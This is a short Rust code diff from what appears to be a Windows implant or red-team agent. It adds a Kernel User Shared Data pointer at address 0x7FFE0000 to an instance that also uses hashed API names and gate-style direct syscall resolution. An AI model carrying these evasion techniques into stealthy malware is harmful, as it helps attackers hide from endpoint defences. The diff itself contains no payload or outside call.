@@ -6,6 +6,7 @@ extern crate alloc;
 
 use alloc::{string::String, vec::Vec};
 use core::ffi::c_void;
+use core::ptr::null;
 use core::sync::atomic::{AtomicBool, Ordering};
 use core::{cell::UnsafeCell, ptr::null_mut};
 use ldr::{ldr_function_addr, ldr_module_peb, nt_current_teb};
@@ -13,7 +14,7 @@ use mod_hhtgates::get_syscall_number;
 use spin::Mutex;
 
 use rs2_win32::ntapi::NtDll;
-use rs2_win32::ntdef::TEB;
+use rs2_win32::ntdef::{KUserSharedData, TEB};
 
 /// Represents a session containing connection information.
 pub struct Session {
@@ -89,6 +90,8 @@ impl Config {
 pub struct Instance {
     /// Pointer to the Thread Environment Block.
     pub teb: *mut TEB,
+    /// Kernel User Shared Data.
+    pub kdata: *mut KUserSharedData,
     /// NtDll instance for native API calls.
     pub ntdll: NtDll,
     /// Session information.
@@ -104,6 +107,7 @@ impl Instance {
     pub fn new() -> Self {
         Instance {
             teb: null_mut(),
+            kdata: null_mut(),
             ntdll: NtDll::new(),
             session: Session::new(),
             config: Config::new(),
@@ -176,6 +180,8 @@ unsafe fn init_global_instance() {
         const NT_OPEN_PROCESS_TOKEN: usize = 0x350dca99;
 
         let mut instance = Instance::new();
+
+        instance.kdata = 0x7FFE0000 as *mut KUserSharedData;
         instance.teb = nt_current_teb();
 
         // Resolve NTDLL functions
